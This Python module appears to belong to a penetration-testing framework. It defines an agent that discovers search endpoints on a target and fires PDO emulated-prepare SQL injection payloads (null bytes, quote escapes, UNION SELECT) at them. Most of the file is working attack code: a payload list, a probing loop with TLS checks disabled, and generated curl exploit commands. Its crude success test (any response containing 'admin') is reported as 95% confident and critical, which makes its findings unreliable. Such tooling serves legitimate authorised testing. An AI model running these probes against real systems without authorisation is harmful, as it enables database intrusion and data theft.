"""
PDO Prepared Statement SQL Injection Capability Agent for PenFlow.

Capabilities:
  - PDO Emulated-Prepare SQL Injection Bypasses (PortSwigger Top 10 2025 nomination)
  - Null Byte (\x00) & Escape Sequence Boundary Manipulation in Prepared Queries
  - Dynamic Search & Query Endpoint Discovery from Recon Observations
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.pdo_sqli")

PDO_PAYLOADS = [
    "%00' OR '1'='1",
    "test%00' UNION SELECT 1,2,3--",
    "test\\' OR 1=1--",
    "test' /*comment*/ OR /*comment*/ '1'='1"
]


class PDOSQLiAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting SQL injection vulnerabilities in PHP PDO emulated prepared statements.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="PDOSQLiAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="pdo_sqli_vulnerability", name="PDO Prepared Statement SQLi", description="Detects SQL injection in PDO emulated prepared statements using null bytes and escape sequences", priority=self.priority, tags=["pdo", "sqli", "prepared_statement"])
        ]

    def _discover_endpoints(self, context: CapabilityExecutionContext, keywords: List[str]) -> List[str]:
        """Dynamically discovers endpoints matching target keywords from recon observations."""
        found = []
        if context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    url = data.get("url", "")
                    if url and any(kw in url.lower() for kw in keywords):
                        found.append(url)
                    elif "endpoints" in data and isinstance(data["endpoints"], list):
                        for ep in data["endpoints"]:
                            if isinstance(ep, dict) and ep.get("url"):
                                ep_url = ep["url"]
                                if any(kw in ep_url.lower() for kw in keywords):
                                    found.append(ep_url)

        dynamic_eps = context.get_dynamic_endpoints()
        if dynamic_eps:
            for ep in dynamic_eps:
                if isinstance(ep, dict) and ep.get("url"):
                    u = ep["url"]
                    if any(kw in u.lower() for kw in keywords):
                        found.append(u)

        if not found:
            base = f"https://{context.asset}"
            found = [
                f"{base}/api/v1/search",
                f"{base}/search",
                f"{base}/query",
                f"{base}/find",
                f"{base}/filter"
            ]

        return list(dict.fromkeys(found))[:5]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        search_urls = self._discover_endpoints(context, ["search", "query", "find", "filter", "q=", "?s="])

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                for target_url in search_urls:
                    for payload in PDO_PAYLOADS:
                        sep = "&" if "?" in target_url else "?"
                        test_url = f"{target_url}{sep}q={payload}"
                        try:
                            resp = await client.get(test_url)
                            if resp.status_code in (200, 500) and ("PDOException" in resp.text or "SQLSTATE" in resp.text or "admin" in resp.text.lower()):
                                curl_cmd = f"curl -i -s -k '{test_url}'"
                                exch_dict = {
                                    "request": {"method": "GET", "url": test_url},
                                    "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                                }

                                findings.append({
                                    "vulnerability_type": "pdo_sqli_vulnerability",
                                    "target_url": test_url,
                                    "payload": payload,
                                    "severity": "CRITICAL",
                                    "confidence": 0.95,
                                    "is_vulnerable": True,
                                    "exploit_curl": curl_cmd,
                                    "reproduction_steps": self.poc_generator.generate_reproduction_steps("PDO Emulated Prepare SQLi", test_url, curl_cmd),
                                    "description": f"PDO Emulated-Prepare SQL Injection confirmed at '{target_url}' via payload '{payload}'.",
                                    "_exchange_obj": exch_dict
                                })
                                evidence["pdo_sqli_success"] = True
                                evidence["tested_endpoint"] = target_url
                                break
                        except Exception as e:
                            logger.debug(f"PDO SQLi test failed on {test_url}: {e}")
                    if findings:
                        break

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
